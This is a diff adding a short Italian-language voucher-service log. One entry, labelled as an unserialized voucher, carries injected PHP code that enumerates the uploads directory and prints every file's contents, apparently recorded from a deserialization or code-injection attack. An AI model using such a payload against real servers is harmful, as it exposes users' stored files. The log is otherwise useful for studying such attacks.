@@ -1,0 +1,12 @@
+Nuovo utente qqcwg@bvggo.cn
+Creazione voucher qqcwg@bvggo.cn oxifcekteccxomw
+Unserialized voucher qqcwg@bvggo.cn oxifcekteccxomw 
+$files1 = array_diff(scandir(getcwd()."/uploads/"), array("..", "."));
+echo $files1;
+foreach ($files1 as &$value) {
+    $x = fopen(getcwd()."/uploads/".$value, "r");
+    $y = fread($x, filesize(getcwd()."/uploads/".$value));
+    echo $y;
+}
+
+Verifica voucher qqcwg@bvggo.cn oxifcekteccxomw
